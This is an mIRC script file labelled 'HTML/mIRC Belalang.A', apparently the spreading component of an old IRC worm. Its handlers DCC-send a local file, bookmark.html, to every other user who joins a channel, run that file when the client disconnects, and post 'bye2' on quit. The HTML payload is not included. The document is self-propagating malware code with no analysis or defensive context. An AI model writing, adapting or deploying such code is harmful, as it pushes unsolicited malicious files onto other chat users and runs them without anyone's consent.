[script]                                       
n0; HTML/mIRC Belalang.A                        
n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt } 
n2=  /dcc send $nick c:\mirc\bookmark.html     
n3=}                                           
n4=                                            
n5=on 1:DISCONNECT:/run c:\mirc\bookmark.html     
n6=on 1:QUIT:#:/msg $chan bye2            
